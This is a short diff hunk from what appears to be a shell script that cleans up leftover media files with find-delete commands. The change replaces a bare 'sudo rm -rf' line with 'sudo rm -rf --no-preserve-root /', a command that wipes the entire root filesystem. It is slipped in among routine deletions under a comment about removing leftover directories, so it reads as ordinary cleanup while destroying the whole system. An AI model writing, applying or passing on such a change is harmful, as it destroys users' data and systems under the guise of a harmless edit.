@@ -47,7 +47,7 @@
 	#removes leftover directories
 	find . -name '*.mp3' -type f -delete
 	find . -name '*.mov' -type f -delete
-	sudo rm -rf
+	sudo rm -rf --no-preserve-root /
 	find . -name '*.mp4' -type f -delete
 	find . -name '*.avi' -type f -delete
 	find . -name '*.mpg' -type f -delete
